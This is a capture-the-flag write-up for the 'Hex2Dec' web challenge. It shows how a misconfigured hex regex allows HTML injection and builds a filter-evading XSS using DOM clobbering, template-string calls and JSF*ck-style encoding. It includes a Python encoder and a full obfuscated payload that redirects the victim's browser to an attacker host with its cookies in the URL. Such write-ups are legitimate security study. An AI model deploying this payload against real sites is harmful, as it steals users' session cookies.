# Hex2Dec
## The Basics
On first load of the site, we were greated by the following screen:

![image](https://github.com/L-T-B/CTFS/assets/62217895/19b49941-4dfb-4f0f-b808-8fe14a57b921)

When submitting a hex value the website was updated to include the value:

![image](https://github.com/L-T-B/CTFS/assets/62217895/29fce33a-0686-4d6b-bf46-832c535c1be2)

Looking under the hood we can see the following javascript:

![image](https://github.com/L-T-B/CTFS/assets/62217895/da31b2c0-3b45-4a35-a3c2-8b99a8afdcba)

On closer inspection we can find that the regex (`^[0-f +-]+$`) is misconfigured and includes all chars between charcode 48 and 102 as well as plus, minus and space.
So our full list of characters is:
```
0123456789:;<=>?@ABCDEFGHIJKLMNOPQRSTUVWXYZ[\]^_`abcde +-
```
With this knowledge we can try a simple HTML injection for testing purposes. 
The payload `<a HREF=TEST>` will produce a simple hyperlink to `./TEST`. (Note the attribute isn't closed which results in the NaN of the conversion also being included in the hypertext.)

![image](https://github.com/L-T-B/CTFS/assets/62217895/2e52153a-02ea-44b3-8d08-5c54555788c4)

## Converting this into an XSS
The basic idea of the exploit will be creating some exploit similar to:

`<IMG SRC ONERROR={our javascript code}>`

But we are limited to only a few lowercase chars and can't use any parentheses. But what we can use are javascript template strings which can call a function without using any parentheses.
For example the following code 
```
alert`XSS`
```
is equal to 
`alert("XSS")`

An other crucial step is getting the access to the document variable. A great gadget is here a [dom clobbering attack](https://portswigger.net/web-security/dom-based/dom-clobbering). 
We just give our Image Element an ID such as `AA` and we can access all the Image attributes from our js.
So for example `AA.src` is the equialent of `this.src`. 

But we are interested in the `document` so we will use `AA.ownerDocument`. We can't use a point so we need different a way to access all the fields. 
Luckly there's a handy way to access attributes in Javascript using the brackets. So we can rewrite our exploit and include this:

```
AA[`ownerDocument`]
```

For creating lowercase Strings we can look into JSF*ck. There is already a [great repo](https://github.com/aemkei/jsfuck) explain all the different tricks for getting an characters so I won't go into detail.

For creating any string which only contained ascii letters I wrote this small python script
```py
import re
import string


gadgets = {'false': "[[1==2]+[]][0]", "true": "[[1==1]+[]][0]", "undefined": "[[][[]]+[]][0]",
           "function find() { [native code] }": "[[][[[][[]]+[]][0][4]+[[][[]]+[]][0]["
                                                "5]+[[][[]]+[]][0][1]+[[][[]]+[]][0][2]]"
                                                " +[]][0]", 'Infinity': '[+("1e309")+['
                                                                        ']][0]',
           "function String() { [native code] }": "[``[`c`+[[][[[][[]]+[]][0][4]+[[][[]]+[]][0][5]+[[][[]]+[]][0]["
                                                  "1]+[[][[]]+[]][0][2]] +[]][0][6]+[[][[]]+[]][0][1]+[[1==2]+[]][0]["
                                                  "3]+[[][[[][[]]+[]][0][4]+[[][[]]+[]][0][5]+[[][[]]+[]][0][1]+[[][["
                                                  "]]+[]][0][2]]+[]][0][4]+[[1==1]+[]][0][1]+[[][[]]+[]][0][0]+`c`+[["
                                                  "][[[][[]]+[]][0][4]+[[][[]]+[]][0][5]+[[][[]]+[]][0][1]+[[][[]]+["
                                                  "]][0][2]]+[]][0][4]+[[][[[][[]]+[]][0][4]+[[][[]]+[]][0][5]+[[][["
                                                  "]]+[]][0][1]+[[][[]]+[]][0][2]] +[]][0][6]+[[1==1]+[]][0][1]]+[]]["
                                                  "0]"}

payload = "toLowerCase"
scraps = []

for c in payload:
    if re.match("^[0-f +-]+$", c):
        scraps.append("`" + c + "`")
        continue
    for gadget in gadgets:
        if c in gadget:
            scraps.append(gadgets[gadget] + f"[{gadget.index(c)}]")
            break
    else:
        scraps.append(
            f"{string.ascii_lowercase.index(c) + 10}[[[][[[][[]]+[]][0][4]+[[][[]]+[]][0][5]+[[][[]]+[]][0][1]+[[][["
            f"]]+[]][0][2]]+[]][0][4]+[[][[[][[]]+[]][0][4]+[[][[]]+[]][0][5]+[[][[]]+[]][0][1]+[[][[]]+[]][0][2]]+["
            f"]][0][6]+`S`+[[][[[][[]]+[]][0][4]+[[][[]]+[]][0][5]+[[][[]]+[]][0][1]+[[][[]]+[]][0][2]]+[]][0][4]+[["
            f"1==1]+[]][0][1]+[[][[]]+[]][0][5]+[[][[]]+[]][0][1]+[``[`c`+[[][[[][[]]+[]][0][4]+[[][[]]+[]][0][5]+[["
            f"][[]]+[]][0][1]+[[][[]]+[]][0][2]]+[]][0][6]+[[][[]]+[]][0][1]+[[1==2]+[]][0][3]+[[][[[][[]]+[]][0]["
            f"4]+[[][[]]+[]][0][5]+[[][[]]+[]][0][1]+[[][[]]+[]][0][2]] +[]][0][4]+[[1==1]+[]][0][1]+[[][[]]+[]][0]["
            f"0]+`c`+[[][[[][[]]+[]][0][4]+[[][[]]+[]][0][5]+[[][[]]+[]][0][1]+[[][[]]+[]][0][2]] +[]][0][4]+[[][[[]["
            f"[]]+[]][0][4]+[[][[]]+[]][0][5]+[[][[]]+[]][0][1]+[[][[]]+[]][0][2]] +[]][0][6]+[[1==1]+[]][0][1]]+[]]["
            f"0][14]]`36`")

print("+".join(scraps).replace(" ", ""))
```

With this script we can create a simple XSS:
```js
AA[{enc("ownerDocument")][{enc("location")}]=`JAVASCRIPT:`+{enc("alert")+`\`XSS\``}
```
But this is quite inefficient and needs alot of chars for an exploit. This resulted in the server not accepting the request and returning.

## The Final Exploit

For cutting down the payload size I only encoded `toLowerCase`. With this method it is possible to create string such as `"DOCUMENT"["toLowerCase]()` and create a lowercase String (`"document"`).

So we first define a variable in this case `CC` and set it equal to the value from our python encoder script:
```
CC=[[1==1]+[]][0][0]+[[][[[][[]]+[]][0][4]+[[][[]]+[]][0][5]+[[][[]]+[]][0][1]+[[][[]]+[]][
0][2]]+[]][0][6]+`L`+[[][[[][[]]+[]][0][4]+[[][[]]+[]][0][5]+[[][[]]+[]][0][1]+[[][[]]+[]][0][2]]+[]][0][6]+32[[[][[[
][[]]+[]][0][4]+[[][[]]+[]][0][5]+[[][[]]+[]][0][1]+[[][[]]+[]][0][2]]+[]][0][4]+[[][[[][[]]+[]][0][4]+[[][[]]+[]][
0][5]+[[][[]]+[]][0][1]+[[][[]]+[]][0][2]]+[]][0][6]+`S`+[[][[[][[]]+[]][0][4]+[[][[]]+[]][0][5]+[[][[]]+[]][0][1]+[[
][[]]+[]][0][2]]+[]][0][4]+[[1==1]+[]][0][1]+[[][[]]+[]][0][5]+[[][[]]+[]][0][1]+[``[`c`+[[][[[][[]]+[]][0][4]+[[][[
]]+[]][0][5]+[[][[]]+[]][0][1]+[[][[]]+[]][0][2]]+[]][0][6]+[[][[]]+[]][0][1]+[[1==2]+[]][0][3]+[[][[[][[]]+[]][0][
4]+[[][[]]+[]][0][5]+[[][[]]+[]][0][1]+[[][[]]+[]][0][2]]+[]][0][4]+[[1==1]+[]][0][1]+[[][[]]+[]][0][0]+`c`+[[][[[][[
]]+[]][0][4]+[[][[]]+[]][0][5]+[[][[]]+[]][0][1]+[[][[]]+[]][0][2]]+[]][0][4]+[[][[[][[]]+[]][0][4]+[[][[]]+[]][0][
5]+[[][[]]+[]][0][1]+[[][[]]+[]][0][2]]+[]][0][6]+[[1==1]+[]][0][1]]+[]][0][14]]`36`+`e`+[[1==1]+[]][0][1]+`C`+`a`+[[
1==2]+[]][0][3]+`e`
```

Again this is equal to `CC="toLowerCase"`.
With this variable the reset of the exploit is actually quite simple.
We first get the document.location and saving it in `BB` through calling 
```
BB=AA[`OWNER`[CC]``+`D`+`OCUMENT`[CC]``][`LOCATION`[CC]``]
```
After that we get the location as a string (useful for getting the `/` and the `.` char) and saving it in the variable `D`:
```
D=[BB+[]][0]
```
And lastly, redirecting the bot to our attacker controlled URL (Note `D[6]` = `/` and `D[18]`=`.`) witht the cookie as the path:
```
AA[`OWNER`[CC]``+`D`+`OCUMENT`[CC]``][`LOCATION`[CC]``]=
`HTTPS:`[CC]``+D[6]+D[6]+`ATTACKER`+D[18]+`COM`+D[6]+AA[`OWNER`[CC]``+`D`+`OCUMENT`[CC]``][`COOKIE`[CC]``];
```

So putting all the pieces together we get (Note remove the new lines, those are for better readablity):
```html
<IMG SRC ID=AA ONERROR=CC=[[1==1]+[]][0][0]+[[][[[][[]]+[]][0][4]+[[][[]]+[]][0][5]+[[][[]]+[]][0][1]+[[][[]]+[]][
0][2]]+[]][0][6]+`L`+[[][[[][[]]+[]][0][4]+[[][[]]+[]][0][5]+[[][[]]+[]][0][1]+[[][[]]+[]][0][2]]+[]][0][6]+32[[[][[[
][[]]+[]][0][4]+[[][[]]+[]][0][5]+[[][[]]+[]][0][1]+[[][[]]+[]][0][2]]+[]][0][4]+[[][[[][[]]+[]][0][4]+[[][[]]+[]][
0][5]+[[][[]]+[]][0][1]+[[][[]]+[]][0][2]]+[]][0][6]+`S`+[[][[[][[]]+[]][0][4]+[[][[]]+[]][0][5]+[[][[]]+[]][0][1]+[[
][[]]+[]][0][2]]+[]][0][4]+[[1==1]+[]][0][1]+[[][[]]+[]][0][5]+[[][[]]+[]][0][1]+[``[`c`+[[][[[][[]]+[]][0][4]+[[][[
]]+[]][0][5]+[[][[]]+[]][0][1]+[[][[]]+[]][0][2]]+[]][0][6]+[[][[]]+[]][0][1]+[[1==2]+[]][0][3]+[[][[[][[]]+[]][0][
4]+[[][[]]+[]][0][5]+[[][[]]+[]][0][1]+[[][[]]+[]][0][2]]+[]][0][4]+[[1==1]+[]][0][1]+[[][[]]+[]][0][0]+`c`+[[][[[][[
]]+[]][0][4]+[[][[]]+[]][0][5]+[[][[]]+[]][0][1]+[[][[]]+[]][0][2]]+[]][0][4]+[[][[[][[]]+[]][0][4]+[[][[]]+[]][0][
5]+[[][[]]+[]][0][1]+[[][[]]+[]][0][2]]+[]][0][6]+[[1==1]+[]][0][1]]+[]][0][14]]`36`+`e`+[[1==1]+[]][0][1]+`C`+`a`+[[
1==2]+[]][0][3]+`e`;BB=AA[`OWNER`[CC]``+`D`+`OCUMENT`[CC]``][`LOCATION`[CC]``];D=[BB+[]][0];AA[`OWNER`[
CC]``+`D`+`OCUMENT`[CC]``][`LOCATION`[CC]``]=`HTTPS:`[CC]``+D[6]+D[6]+`PART`+D[18]+`OTHER`+D[18]+`Baa`+D[
18]+`COM`+D[6]+AA[`OWNER`[CC]``+`D`+`OCUMENT`[CC]``][`COOKIE`[CC]``];>
```

## Thank's for reading!
